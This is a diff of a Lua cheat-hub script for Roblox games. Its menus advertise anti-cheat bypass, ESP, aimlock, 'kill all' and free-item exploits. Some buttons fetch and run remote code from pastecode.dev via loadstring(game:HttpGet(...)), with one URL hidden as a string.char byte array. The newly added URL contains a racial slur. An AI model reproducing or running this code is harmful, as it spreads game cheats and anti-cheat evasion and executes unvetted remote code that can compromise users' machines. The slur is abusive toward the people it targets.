@@ -99,7 +99,26 @@ RunService.RenderStepped:connect(function()
 enablestuff()
 end)
 
-SkriptsSection:NewDropdown("(NEW) 🌟ULTIMATE EASY OBBY\n(INSTANT UGX)", "updates and add-ons to the skript will be here", {"Version: 8.9", "updates:", "🚨EXEKUTE ANTI-BYFRON IF BYFRON SHOWS🚨", "new soon", "⚔️ Weapon Fighting Simulator(FREEUGX)\n[plaid shirt]", "🦸‍♀️[OP] Legends Arena 🦸skript\n(kill all, hitbox &more)", "💦 Songkran Festival: The Splash Kingdom", "⚔️Weapon fighting sim\nFREEUGX(Duo Katana)", "🐇🏁 Pet Raxer Simulator(free ugx)", "🥶❄️ XHILLY OBBY(INSTANT FREE\nLIMITED ITEM)", "🏪WALMART DISKOVERED (LIMITED ITEM)", "🍕 Pizzaria Tykoon LIMITED UGX", "🥤BLUE BUBBLE TEA(INSTANT ITEM)", "🧟‍♀️ZOMBIE DEFENSE (free sword item)", "🫂karry a friend 3 ugx", "🩸🔪 GRIEFVILLE x cHUcKY:\nNightmare(FREEUGX)", "🐟 Blippi's Playground 🐟", "🧥MAX MARA KOATS ADVENTURE\n(INSTANT UGX,2ND DROP)", "🥤BUBBLE-TEA TYKOON (INSTANT UGX)", "🎈[World of Optiks] LensKrafters Eye Odyssey", "😸👋🏽 MY HELLO KITTY KAFE", "[❄️NEW! SNOW PARTY❄️] JBL LAND", "🎥 🏃🏽‍♂️💨Kameraman Race Simulator 🎥🏃🏽‍♂️💨", "JUMP FOR UGX", "❇️ 🎉 Gummy Bear Party! 🎉 ❇️", "(NEW) 💦SONGKRAN EVENT 4 FREE UGX🎉", "👓Xhill Obby🥶 INSTANT FREE UGX", "JBL LAND 🧥 (INSTANT UGX)", "(NEW) evade hub(dot.hub) by CF Trail (OP)", "(NEW games)tongue battles👅, pirate tykoon🏴‍☠️", "🦄 Singapore Wanderland 🦄", "[NEW!] FREE UGX SPINNER☸️", "[UGX] 🤓Math Answer or Die", "💪🏽Bulked Up (FREE UGX)💪🏽", "🌌Sol's RNG🌌 (UGX)", "🤺[RELEASE]Bladers: Rebirth🤺 (UGX)", "(NEW) 🌟ULTIMATE EASY OBBY\n2nd drop(Games)", "(NEW) 📸The Maze skript",  "FREE UGX for GRIEFVILLE🩸🔪", "prinxe of egypt 🇪🇬FREE UGX", "🥋karate fight sim FREE UGX", "-added 🌿cHANGIVERSE(9 FREE UGX)", "-added AVNU💃🏽🕺🏾 FREE UGX", "MULTIPLE INSTANT FREE UGc for Lunxhable Playables🥪\n(Games)", "- 2 FREE ugc skript[Last to Leave]\n(Games)", "-added ⭐️FREE Ugx SKRIPTS(Games)", "-added anti-xheat bypass", "-added highlight players ESP\nHighlight kolor pixker", "xhelulu,HG💚🍭🍜"}, function(currentOption)
+
+-- [ UPDATE TIME ] --
+local timelabel = SkriptsSection:NewLabel("🔴 Live Time : [00:00:00]") -- initial time
+
+-- [ UPDATE TIME ] --
+local function updateTimeLabel()
+    while true do
+        local formatted_time = os.date("🔴Live Time: %I:%M:%S %p")
+    local todays_date = os.date("Today's Date: %A | %B %d, %Y")
+        -- %I=12 Hour; %M=Minute; %S=Second; %p=AM/PM; %A=Day of week; %d=Day of month; %m=Month; %Y=Year
+
+timelabel:UpdateLabel("[" ..formatted_time.."]\n ["..todays_date.."]")
+        wait(0.01)
+    end
+end
+
+spawn(updateTimeLabel)
+-- [ END UPDATE TIME ] --
+
+SkriptsSection:NewDropdown("(NEW) DAHOOD-AURA X, AZURE💩🚽", "updates and add-ons to the skript will be here", {"Version: 8.9", "updates:", "🚨EXEKUTE ANTI-BYFRON IF BYFRON SHOWS🚨", "new soon", "⚔️ Weapon Fighting Simulator(FREEUGX)\n[plaid shirt]", "🦸‍♀️[OP] Legends Arena 🦸skript\n(kill all, hitbox &more)", "💦 Songkran Festival: The Splash Kingdom", "⚔️Weapon fighting sim\nFREEUGX(Duo Katana)", "🐇🏁 Pet Raxer Simulator(free ugx)", "🥶❄️ XHILLY OBBY(INSTANT FREE\nLIMITED ITEM)", "🏪WALMART DISKOVERED (LIMITED ITEM)", "🍕 Pizzaria Tykoon LIMITED UGX", "🥤BLUE BUBBLE TEA(INSTANT ITEM)", "🧟‍♀️ZOMBIE DEFENSE (free sword item)", "🫂karry a friend 3 ugx", "🩸🔪 GRIEFVILLE x cHUcKY:\nNightmare(FREEUGX)", "🐟 Blippi's Playground 🐟", "🧥MAX MARA KOATS ADVENTURE\n(INSTANT UGX,2ND DROP)", "🥤BUBBLE-TEA TYKOON (INSTANT UGX)", "🎈[World of Optiks] LensKrafters Eye Odyssey", "😸👋🏽 MY HELLO KITTY KAFE", "[❄️NEW! SNOW PARTY❄️] JBL LAND", "🎥 🏃🏽‍♂️💨Kameraman Race Simulator 🎥🏃🏽‍♂️💨", "JUMP FOR UGX", "❇️ 🎉 Gummy Bear Party! 🎉 ❇️", "(NEW) 💦SONGKRAN EVENT 4 FREE UGX🎉", "👓Xhill Obby🥶 INSTANT FREE UGX", "JBL LAND 🧥 (INSTANT UGX)", "(NEW) evade hub(dot.hub) by CF Trail (OP)", "(NEW games)tongue battles👅, pirate tykoon🏴‍☠️", "🦄 Singapore Wanderland 🦄", "[NEW!] FREE UGX SPINNER☸️", "[UGX] 🤓Math Answer or Die", "💪🏽Bulked Up (FREE UGX)💪🏽", "🌌Sol's RNG🌌 (UGX)", "🤺[RELEASE]Bladers: Rebirth🤺 (UGX)", "(NEW) 🌟ULTIMATE EASY OBBY\n2nd drop(Games)", "(NEW) 📸The Maze skript",  "FREE UGX for GRIEFVILLE🩸🔪", "prinxe of egypt 🇪🇬FREE UGX", "🥋karate fight sim FREE UGX", "-added 🌿cHANGIVERSE(9 FREE UGX)", "-added AVNU💃🏽🕺🏾 FREE UGX", "MULTIPLE INSTANT FREE UGc for Lunxhable Playables🥪\n(Games)", "- 2 FREE ugc skript[Last to Leave]\n(Games)", "-added ⭐️FREE Ugx SKRIPTS(Games)", "-added anti-xheat bypass", "-added highlight players ESP\nHighlight kolor pixker", "xhelulu,HG💚🍭🍜"}, function(currentOption)
 print(currentOption)
 end)
 
@@ -2523,7 +2542,7 @@ GamesSection:NewLabel("🏁END OF FREE UGX🏁")
 -- [ 🏁⭐️END OF FREE UGX⭐️🏁 ] --
 
 -- [ 🏚️🧱 Da Hood 🧱🏚️ ] --
-local GamesSection = Games:NewSection("[🏚️🧱 Da Hood 🧱🏚️] (work for any dh game)")
+local GamesSection = Games:NewSection("[🏚️🔫🧱 Da Hood 🧱🔫🏚️] (work for any dh game)")
 
 GamesSection:NewButton("Rainbow Sunshine Aimloxk(OP,paid)\ntype >enable inventory<if tool not visible", "type >enable inventory<if tool not visible", function()  
 --rainbow loxk 
@@ -2532,6 +2551,10 @@ end)
 GamesSection:NewButton("FUXK AURA X FUXK DH", "FUXK DH HEAVILY SKID", function()
 --FUXK AURA X REMAKE FUXK DAHOOD
 loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,99,111,100,101,46,100,101,118,47,114,97,119,47,105,100,52,104,57,112,107,119,47,114,114,105,120,104), true))()
+end)
+GamesSection:NewButton("FUXK AZURE", "fuxk azure", function()
+--FUXK AZURe too
+loadstring(game:HttpGet("https://pastecode.dev/raw/sar2waj1/fuxkazurefuxktykusionWhatever.that.nigga.name.is.........----..-.-.....-.-...-...-.zip",true))()
 end)
 GamesSection:NewButton("tp walk (universal but i put it here)", "it aint jus for dh", function()
 --tpwalk
